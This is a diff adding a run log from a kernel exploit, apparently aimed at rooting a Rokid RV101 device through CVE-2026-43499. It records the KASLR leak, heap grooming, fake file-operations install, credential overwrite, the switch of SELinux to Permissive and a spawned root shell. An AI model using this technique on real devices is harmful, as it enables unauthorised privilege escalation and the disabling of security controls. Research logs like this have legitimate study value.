@@ -1,0 +1,162 @@
+=== GHOSTLOCK RUNLOG ===
+tag=w2 version=v960 ts=162011
+--- host time ---
+Sat Aug 22 04:20:11 PM CST 2026
+--- uptime before ---
+ 16:20:11 up 0 min,  0 users,  load average: 3.13, 0.70, 0.23
+--- loadavg before ---
+3.13 0.70 0.23 2/1325 2911
+--- nr_threads (field 4 total) ---
+running/total=2/1325
+--- meminfo head ---
+MemTotal:        1816600 kB
+MemFree:          164968 kB
+MemAvailable:     817784 kB
+Buffers:            4984 kB
+--- getenforce before ---
+Enforcing
+--- device binary sha1 ---
+4eeb98171ed21113130d5f2676a0bd283c8f56c7  /data/local/tmp/ghostlock_rv101
+--- local binary sha1 ---
+4eeb98171ed21113130d5f2676a0bd283c8f56c7  /mnt/c/Users/<USER>/Documents/codebase/rokid_root/source_code/ghostlock_rv101/build/ghostlock_rv101
+--- environment ---
+--- command ---
+GL_PURGE_CNT=0\ GL_TAIL_KILLS=16\ GL_DUMMY_KILLS=0\ W2_ATTEMPTS=1\ /data/local/tmp/ghostlock_rv101 
+=== RUN OUTPUT ===
+[+] ghostlock_rv101 v9.60 — CVE-2026-43499 (GhostLock) / Rokid RV101 1.22.009
+[+] startup: pid=2923 uid=2000 euid=2000 gid=2000
+[*] [T+26626ms] KASLR leak
+[*] printk_formats: "Rescheduling interrupts" -> 0xffffffe8ba22ac0c slide=0x00000028b0600000
+[*] printk_formats: "Function call interrupts" -> 0xffffffe8ba2ca100 slide=0x00000028b0600000
+[+] KASLR: slide=0x00000028b0600000 base=0xffffffe8b8600000 (2 anchors)
+[*] FOPS install attempt 1/3
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+Threads:	4097
+[*] v9.13 diag: dummy clones ok=450 fail=0 (first errno=0 Success)
+[*] v9.15 diag: purge clones ok=0 fail=0
+[*]   collision[1]: 0000006c8af28ef0 (t=9569, ratio=1913)
+[*]   collision[2]: 0000006c8af4c010 (t=9629, ratio=1925)
+[*]   collision[3]: 0000006c8b5a72e8 (t=9584, ratio=1916)
+[*] kernelsnitch: top times: 9629 9584 9569 9 9 9 9 9
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=13584 mm=FOUND
+[*] kernelsnitch: elapsed 1813ms mm=ffffff801da6c000
+[*] leaked mm=ffffff801da6c000 slab base=ffffff801da6c000
+[*] v9.14 settle[settle]: 61 rounds, o2=1198 objs=796 (quiet=11)
+[*] v9.10 gate: mm slabs 85 -> 84 objs 796 -> 683 (dip=1 calm=0)
+[*] v9.12 reclaim: o2 42 -> 2002 across full sequence (gate window 85 -> 2002, first-send=1)
+[*] v9.12 reclaim: 768/768 socketpairs, 768/768 SKB vehicles sent (15872 bytes each)
+[*] requeue ret=-1 errno=35
+[*] waiter wait_requeue_pi ret=-1 errno=110
+[*] pselect route target=ffffff801da6d608 value=ffffff801da6d500 mode=5 page=ffffff801da6c000 fake_lock=ffffff801da6ce00 fake_w0=ffffff801da6d000 fake_task=ffffff801da6d200 in=0000000000000000 out1=ffffff801da6d600 out2=ffffffe8bafbcbc0 out3=0000000000000000 out4=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff801da6d200 ex3=ffffff801da6ce00 ex4=8000000000000082
+[*] pselect: calling select now (window 200000us, forged bytes resident)
+[*] consumer punch 1/5 (+20000us) tid=9038
+[*] consumer punch 1 returned ret=0 errno=0
+[*] consumer punch 2/5 (+55000us) tid=9038
+[*] consumer punch 2 returned ret=0 errno=0
+[*] consumer punch 3/5 (+90000us) tid=9038
+[*] consumer punch 3 returned ret=0 errno=0
+[*] consumer punch 4/5 (+125000us) tid=9038
+[*] consumer punch 4 returned ret=0 errno=0
+[*] consumer punch 5/5 (+160000us) tid=9038
+[*] consumer punch 5 returned ret=0 errno=0
+[*] pselect: select returned
+[*] pselect returned ret=0 errno=0 calls=5 success=5
+[*] punch_done=1 (waited 0 spins)
+[*] owner lock chain ret=0 errno=0
+[*]   DIAG veh[0] n=15872 llseek=0xffffffe8b981ab88 read=0xffffffe8b9839168 scratch=0x0000000000000000 safe=0x0000000000000000
+[*]   DIAG veh[1] n=15872 llseek=0xffffffe8b981ab88 read=0xffffffe8b9839168 scratch=0x0000000000000000 safe=0x0000000000000000
+[*]   DIAG veh[2] n=15872 llseek=0xffffffe8b981ab88 read=0xffffffe8b9839168 scratch=0x0000000000000000 safe=0x0000000000000000
+[*] install_fake_fops_v2 DIAG: write#1 LANDED (vehicle 12, llseek=0xffffffe8bafbcbc0 exp=0xffffffe8bafbcbc0)
+[*] configfs_read: blob OK, about to pread
+[*] configfs_read target=0xffffffe8ba7ebd08 len=8 -> r=8 errno=0
+[*] configfs probe: init_task.tasks.next = 0xffffff8001033b88
+[+] fake_fops installed into ashmem_misc.fops
+[*] [T+62232ms] FOPS installed
+[*] configfs_read: blob OK, about to pread
+[*] configfs_read target=0xffffffe8ba7ebd10 len=8 -> r=8 errno=0
+[*] configfs_read: blob OK, about to pread
+[*] configfs_read target=0xffffffe8ba7ebd10 len=8 -> r=8 errno=0
+[*] round 1/1: child=9042 prev=0xffffff80481bf248 prev2=0xffffff80481bf248 stable=1 task=0xffffff80481bed80
+[*]   cred_slot=0xffffff80481bf500 real_cred_slot=0xffffff80481bf4f8 init_cred=0xffffffe8ba802058
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+Threads:	4097
+[*]   collision[1]: 0000006c88d266b0 (t=9353, ratio=1870)
+[*] v9.13 diag: dummy clones ok=450 fail=0 (first errno=0 Success)
+[*] v9.15 diag: purge clones ok=0 fail=0
+[*]   collision[2]: 0000006c894d4420 (t=9629, ratio=1925)
+[*]   collision[3]: 0000006c8a62cee0 (t=9611, ratio=1922)
+[*] kernelsnitch: top times: 9629 9611 9353 9 9 9 9 9
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=13050 mm=FOUND
+[*] kernelsnitch: elapsed 3086ms mm=ffffff8038916580
+[*] leaked mm=ffffff8038916580 slab base=ffffff8038914000
+[*] v9.14 settle[settle]: 61 rounds, o2=2189 objs=1282 (quiet=12)
+[*] v9.10 gate: mm slabs 113 -> 112 objs 1282 -> 1162 (dip=1 calm=0)
+[*] v9.12 reclaim: o2 0 -> 3421 across full sequence (gate window 113 -> 3421, first-send=1)
+[*] v9.12 reclaim: 768/768 socketpairs, 768/768 SKB vehicles sent (15872 bytes each)
+[*] requeue ret=-1 errno=35
+[*] waiter wait_requeue_pi ret=-1 errno=110
+[*] pselect route target=ffffffe8ba802060 value=ffffff8038915500 mode=5 page=ffffff8038914000 fake_lock=ffffff8038914e00 fake_w0=ffffff8038915000 fake_task=ffffff8038915200 in=0000000000000000 out1=ffffffe8ba802058 out2=ffffff80481bf500 out3=0000000000000000 out4=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff8038915200 ex3=ffffff8038914e00 ex4=8000000000000082
+[*] pselect: calling select now (window 200000us, forged bytes resident)
+[*] consumer punch 1/5 (+20000us) tid=14444
+[*] consumer punch 1 returned ret=0 errno=0
+[*] consumer punch 2/5 (+55000us) tid=14444
+[*] consumer punch 2 returned ret=0 errno=0
+[*] consumer punch 3/5 (+90000us) tid=14444
+[*] consumer punch 3 returned ret=0 errno=0
+[*] consumer punch 4/5 (+125000us) tid=14444
+[*] consumer punch 4 returned ret=0 errno=0
+[*] consumer punch 5/5 (+160000us) tid=14444
+[*] consumer punch 5 returned ret=0 errno=0
+[*] pselect: select returned
+[*] pselect returned ret=1 errno=0 calls=5 success=5
+[*] punch_done=1 (waited 0 spins)
+[*] owner lock chain ret=0 errno=0
+[*] cleanup: 0 vehicle(s) with diffs, 0 with STRICT signature
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+Threads:	4097
+[*] v9.13 diag: dummy clones ok=450 fail=0 (first errno=0 Success)
+[*] v9.15 diag: purge clones ok=0 fail=0
+[*]   collision[1]: 0000006c86e00d80 (t=9505, ratio=1901)
+[*]   collision[2]: 0000006c872670b8 (t=9629, ratio=1925)
+[*]   collision[3]: 0000006c8740cde0 (t=9616, ratio=1923)
+[*] kernelsnitch: top times: 9629 9616 9505 9 9 9 9 7
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=12891 mm=FOUND
+[*] kernelsnitch: elapsed 2484ms mm=ffffff8036708f00
+[*] leaked mm=ffffff8036708f00 slab base=ffffff8036708000
+[*] v9.14 settle[settle]: 39 rounds, o2=2480 objs=1329 (quiet=20)
+[*] v9.10 gate: mm slabs 116 -> 116 objs 1329 -> 1212 (dip=0 calm=3604)
+[*] v9.12 reclaim: o2 74 -> 3056 across full sequence (gate window 116 -> 3056, first-send=1)
+[*] v9.12 reclaim: 768/768 socketpairs, 768/768 SKB vehicles sent (15872 bytes each)
+[*] requeue ret=-1 errno=35
+[*] waiter wait_requeue_pi ret=-1 errno=110
+[*] pselect route target=ffffffe8ba802060 value=ffffff8036709500 mode=5 page=ffffff8036708000 fake_lock=ffffff8036708e00 fake_w0=ffffff8036709000 fake_task=ffffff8036709200 in=0000000000000000 out1=ffffffe8ba802058 out2=ffffff80481bf4f8 out3=0000000000000000 out4=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff8036709200 ex3=ffffff8036708e00 ex4=8000000000000082
+[*] pselect: calling select now (window 200000us, forged bytes resident)
+[*] consumer punch 1/5 (+20000us) tid=19808
+[*] consumer punch 1 returned ret=0 errno=0
+[*] consumer punch 2/5 (+55000us) tid=19808
+[*] consumer punch 2 returned ret=0 errno=0
+[*] consumer punch 3/5 (+90000us) tid=19808
+[*] consumer punch 3 returned ret=0 errno=0
+[*] consumer punch 4/5 (+125000us) tid=19808
+[*] consumer punch 4 returned ret=0 errno=0
+[*] consumer punch 5/5 (+160000us) tid=19808
+[*] consumer punch 5 returned ret=0 errno=0
+[*] pselect: select returned
+[*] pselect returned ret=1 errno=0 calls=5 success=5
+[*] punch_done=1 (waited 0 spins)
+[*] owner lock chain ret=0 errno=0
+[*] cleanup: 0 vehicle(s) with diffs, 0 with STRICT signature
+[*] child uid = 0 (0x00000000) gid = 0 (0x00000000)
+[+] child is root!
+[*] cleanup: 0 vehicle(s) with diffs, 0 with STRICT signature
+[+] GHOSTLOCK ROOT: uid=0 gid=0
+uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
+Permissive
+[+] dropping to root shell
+[*] [T+134694ms] exploit complete — root shell spawned via /data/local/tmp/.ghostlock_root.sh
